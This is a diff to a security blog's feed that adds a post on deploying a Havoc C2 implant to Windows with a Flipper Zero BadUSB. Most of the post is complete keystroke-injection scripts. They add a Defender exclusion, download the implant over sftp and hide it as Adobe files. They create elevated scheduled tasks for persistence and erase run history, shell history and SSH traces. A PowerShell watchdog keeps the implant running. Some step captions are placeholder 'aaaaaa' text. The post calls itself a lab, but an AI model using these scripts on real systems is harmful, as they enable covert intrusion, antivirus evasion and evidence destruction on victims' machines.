@@ -3,14 +3,318 @@
     <title>Cibersec and hacking blog</title>
     <link href="https://b4shnhawx.github.io/feed.xml" rel="self" />
     <link href="https://b4shnhawx.github.io" />
-    <updated>2024-12-31T19:10:33+01:00</updated>
+    <updated>2025-01-07T17:58:30+01:00</updated>
     <author>
         <name>b4shnhawx</name>
     </author>
     <id>https://b4shnhawx.github.io</id>
 
     <entry>
-        <title>Creating C2 with HAVOC in Kali Linux</title>
+        <title>Deploying C2 malware pt.2 [2] - Flipper Zero BadUSB</title>
+        <author>
+            <name>b4shnhawx</name>
+        </author>
+        <link href="https://b4shnhawx.github.io/flipper-zero-badusb.html"/>
+        <id>https://b4shnhawx.github.io/flipper-zero-badusb.html</id>
+            <category term="windows"/>
+            <category term="powershell"/>
+            <category term="os"/>
+            <category term="offensive"/>
+            <category term="hacking"/>
+            <category term="flipperzero"/>
+
+        <updated>2024-12-31T20:07:42+01:00</updated>
+            <summary>
+                <![CDATA[
+                    Taking a step further from what we saw in the Havoc C2 post, let's take it a step further. Lets use the app BadUSB from Flipper Zero&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <p>Taking a step further from what we saw in the <a href="https://b4shnhawx.github.io/creating-c2-with-havoc-in-kali-linux.html">Havoc C2 post</a>, let's take it a step further. </p>
+<p>Lets use the app BadUSB from Flipper Zero to inject malicious code in Windows 10/11 (also you can use Rubber Ducky). <br><br>In the lab we will:</p>
+<ul>
+<li>Avoid the detection in Windows Defender [<span style="color: #b96ad9;">EVASION </span>: <span style="color: #e03e2d;">T1564.012</span>].</li>
+<li>Download the payload from the Havoc server [<span style="color: #b96ad9;">OBTAIN CAPABILITIES</span> : <span style="color: #e03e2d;">T1588.001</span>].</li>
+<li>Create a task to execute it every boot and logon [<span style="color: #b96ad9;">PERSISTENCE</span> : <span style="color: #e03e2d;">T1053.005</span>].</li>
+<li>OPTIONAL - Deploy a script that checks if the demon.exe its currently running to avoid duplicate processes and difficult the detection [<span style="color: #b96ad9;">EVASION</span>].<br><br></li>
+</ul>
+<h3><strong>HOW IT WORKS?</strong></h3>
+<hr class="line">
+<p>Simply put, each device has a HID (Human Interface Device) that identifies which device it is. <br><br>Rubber Ducky (and Flipper Zero's BadUSB) shows the computer that its HID corresponds to a keyboard or mouse, allowing it to <em>"typing"</em> from a preloaded script.</p>
+<h3>CREATION OF THE BADUSB / RUBBER DUCKY SCRIPT</h3>
+<hr class="line">
+<ol>
+<li>aaaaaa<br>
+<pre class="language-bash"><code>REM --&gt; Prepare terminal
+DELAY 1000
+REM --&gt; GUI d
+DELAY 150
+GUI r
+DELAY 400
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+ALT s
+DELAY 2000
+CTRL c
+DELAY 500
+STRING color FE &amp; mode con:cols=15 lines=1
+ENTER
+STRING powershell
+ENTER
+DELAY 50
+STRING cd "$env:USERPROFILE\"
+ENTER
+DELAY 50</code></pre>
+</li>
+<li>aaaaaa<br>
+<pre class="language-bash"><code>REM --&gt; Exception
+STRING New-Item -ItemType Directory -Path "$env:UserProfile\AppData\Local\.adobe_reader" -Force &gt; $null 2&gt;&amp;1
+ENTER
+DELAY 50
+STRING Add-MpPreference -ExclusionPath "$env:UserProfile\AppData\Local\.adobe_reader\demon.x64.exe"
+ENTER
+DELAY 50</code></pre>
+</li>
+<li>aaaaaa<br>
+<pre class="language-bash"><code>REM --&gt; Transfer C2 exe SSH
+STRING (Get-Content ".\.ssh\known_hosts") | Where-Object { $_ -notmatch "172\.233\.32\.196" } | Set-Content ".\.ssh\known_hosts"
+ENTER
+DELAY 100
+STRING copy .\.ssh\known_hosts .\.ssh\known_hosts_bckp
+ENTER
+DELAY 100
+STRING sftp &lt;SFTP USER&gt;@&lt;SFTP SERVER IP&gt;
+ENTER
+DELAY 500
+STRING yes
+ENTER
+DELAY 500
+STRING &lt;SFTP PASSWORD&gt;
+ENTER
+DELAY 500
+STRING cd ../download
+ENTER
+DELAY 100
+STRING lcd AppData\Local\.adobe_reader
+ENTER
+DELAY 100
+STRING get demon.x64.exe
+ENTER
+DELAY 2000
+STRING get Adobe_Reader_Init.ps1
+ENTER
+DELAY 2000
+STRING bye
+ENTER
+DELAY 100</code></pre>
+</li>
+<li>aaaaaa<br>
+<pre class="language-bash"><code>REM --&gt; Persistence
+STRING $scheduleObject = New-Object -ComObject schedule.service; $scheduleObject.connect(); $rootFolder = $scheduleObject.GetFolder("\Microsoft"); $rootFolder.CreateFolder("Adobe")
+ENTER
+DELAY 100
+STRING schtasks /create /sc onstart /tn "Microsoft\Adobe\AdobeServiceBoot" /tr "cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\AppData\Local\.adobe_reader\Adobe_Reader_Init.ps1’”" /rl highest
+ENTER
+DELAY 50
+STRING schtasks /create /sc onevent /mo "*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4648]]" /ec Security /tn "Microsoft\Adobe\AdobeServiceLogon" /tr "cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\AppData\Local\.adobe_reader\Adobe_Reader_Init.ps1’”" /rl highest
+ENTER
+DELAY 100
+STRING schtasks /run /tn "Microsoft\Adobe\AdobeServiceLogon"
+ENTER
+DELAY 100</code></pre>
+</li>
+<li>aaaaaa<br>
+<pre class="language-bash"><code>REM --&gt; Clean up
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+DELAY 10
+STRING copy .\.ssh\known_hosts_bckp .\.ssh\known_hosts
+ENTER
+DELAY 100
+STRING del .\.ssh\known_hosts_bckp
+ENTER
+DELAY 10
+STRING del AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ENTER
+DELAY 10
+STRING exit
+ENTER
+DELAY 10
+STRING exit
+ENTER
+DELAY 10</code></pre>
+</li>
+</ol>
+<h3> </h3>
+<h3>OPTIONAL - CREATION OF THE POWERSHELL SCRIPT</h3>
+<hr class="line">
+<p>Simply put, each device</p>
+<ol>
+<li>aaaaaaaa<br>
+<pre class="language-bash"><code>$processName = "demon.x64.exe"
+$executablePath = "$env:USERPROFILE\AppData\Local\.adobe_reader\demon.x64.exe"
+$serverIP = "&lt;HAVOC SERVER IP&gt;"</code></pre>
+</li>
+<li>aaaaaaaa<br>
+<pre class="language-bash"><code>$processesWithConnections = Get-NetTCPConnection |
+    Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" -and $_.State -eq "Established" } |
+    Select-Object -Property OwningProcess
+
+$connectedProcessIds = $processesWithConnections | ForEach-Object { $_.OwningProcess }</code></pre>
+</li>
+<li>aaaaaaaa<br>
+<pre class="language-bash"><code>Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue |
+    Where-Object { $connectedProcessIds -notcontains $_.Id } |
+    ForEach-Object {
+        Write-Output "Terminate process $($processName) with ID $($_.Id) without connection."
+        Stop-Process -Id $_.Id -Force
+    }</code></pre>
+</li>
+<li>aaaaaaaa<br>
+<pre class="language-bash"><code>Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue ; Get-NetTCPConnection | Select-Object -Property OwningProcess, LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Sort-Object -Property OwningProcess | Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" }</code></pre>
+</li>
+<li>aaaaaaaa<br>
+<pre class="language-bash"><code>if (-not $connectedProcessIds) {
+    Write-Output "There are no processes with active connection. Executing $executablePath..."
+    Start-Process -FilePath $executablePath -NoNewWindow
+} else {
+    Write-Output "There is already a process with an active connection. No action is taken."
+}
+</code></pre>
+</li>
+</ol>
+<h3><strong>FULL BADUSB / RUBBER DUCKY SCRIPT</strong></h3>
+<hr class="line">
+<pre class="language-bash"><code>REM --&gt; Prepare terminal
+DELAY 1000
+REM --&gt; GUI d
+DELAY 150
+GUI r
+DELAY 400
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 2000
+ALT y
+ALT s
+DELAY 2000
+CTRL c
+DELAY 500
+STRING color FE &amp; mode con:cols=15 lines=1
+ENTER
+STRING powershell
+ENTER
+DELAY 50
+STRING cd "$env:USERPROFILE\"
+ENTER
+DELAY 50
+REM --&gt; Exception
+STRING New-Item -ItemType Directory -Path "$env:UserProfile\AppData\Local\.adobe_reader" -Force &gt; $null 2&gt;&amp;1
+ENTER
+DELAY 50
+STRING Add-MpPreference -ExclusionPath "$env:UserProfile\AppData\Local\.adobe_reader\demon.x64.exe"
+ENTER
+DELAY 50
+REM --&gt; Transfer C2 exe SSH
+STRING (Get-Content ".\.ssh\known_hosts") | Where-Object { $_ -notmatch "172\.233\.32\.196" } | Set-Content ".\.ssh\known_hosts"
+ENTER
+DELAY 100
+STRING copy .\.ssh\known_hosts .\.ssh\known_hosts_bckp
+ENTER
+DELAY 100
+STRING sftp &lt;SFTP USER&gt;@&lt;SFTP SERVER IP&gt;
+ENTER
+DELAY 500
+STRING yes
+ENTER
+DELAY 500
+STRING &lt;SFTP PASSWORD&gt;
+ENTER
+DELAY 500
+STRING cd ../download
+ENTER
+DELAY 100
+STRING lcd AppData\Local\.adobe_reader
+ENTER
+DELAY 100
+STRING get demon.x64.exe
+ENTER
+DELAY 2000
+STRING get Adobe_Reader_Init.ps1
+ENTER
+DELAY 2000
+STRING bye
+ENTER
+DELAY 100
+REM --&gt; Persistence
+STRING $scheduleObject = New-Object -ComObject schedule.service; $scheduleObject.connect(); $rootFolder = $scheduleObject.GetFolder("\Microsoft"); $rootFolder.CreateFolder("Adobe")
+ENTER
+DELAY 100
+STRING schtasks /create /sc onstart /tn "Microsoft\Adobe\AdobeServiceBoot" /tr "cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\AppData\Local\.adobe_reader\Adobe_Reader_Init.ps1’”" /rl highest
+ENTER
+DELAY 50
+STRING schtasks /create /sc onevent /mo "*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4648]]" /ec Security /tn "Microsoft\Adobe\AdobeServiceLogon" /tr "cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\AppData\Local\.adobe_reader\Adobe_Reader_Init.ps1’”" /rl highest
+ENTER
+DELAY 100
+STRING schtasks /run /tn "Microsoft\Adobe\AdobeServiceLogon"
+ENTER
+DELAY 100
+REM --&gt; Clean up
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+DELAY 10
+STRING copy .\.ssh\known_hosts_bckp .\.ssh\known_hosts
+ENTER
+DELAY 100
+STRING del .\.ssh\known_hosts_bckp
+ENTER
+DELAY 10
+STRING del AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+ENTER
+DELAY 10
+STRING exit
+ENTER
+DELAY 10
+STRING exit
+ENTER
+DELAY 10</code></pre>
+<p> </p>
+<h3><strong>OPTIONAL - FULL POWERSHELL SCRIPT</strong></h3>
+<hr class="line">
+<pre class="language-visual-basic"><code>$processName = "demon.x64.exe"
+$executablePath = "$env:USERPROFILE\AppData\Local\.adobe_reader\demon.x64.exe"
+$serverIP = "&lt;HAVOC SERVER IP&gt;"
+
+$processesWithConnections = Get-NetTCPConnection |
+    Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" -and $_.State -eq "Established" } |
+    Select-Object -Property OwningProcess
+
+$connectedProcessIds = $processesWithConnections | ForEach-Object { $_.OwningProcess }
+
+Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue |
+    Where-Object { $connectedProcessIds -notcontains $_.Id } |
+    ForEach-Object {
+        Write-Output "Terminate process $($processName) with ID $($_.Id) without connection."
+        Stop-Process -Id $_.Id -Force
+    }
+
+Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue ; Get-NetTCPConnection | Select-Object -Property OwningProcess, LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Sort-Object -Property OwningProcess | Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" }
+
+if (-not $connectedProcessIds) {
+    Write-Output "There are no processes with active connection. Executing $executablePath..."
+    Start-Process -FilePath $executablePath -NoNewWindow
+} else {
+    Write-Output "There is already a process with an active connection. No action is taken."
+}
+</code></pre>
+<p> </p>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>Deploying C2 malware pt.1 [2] - Creating C2 with HAVOC in Kali Linux</title>
         <author>
             <name>b4shnhawx</name>
         </author>
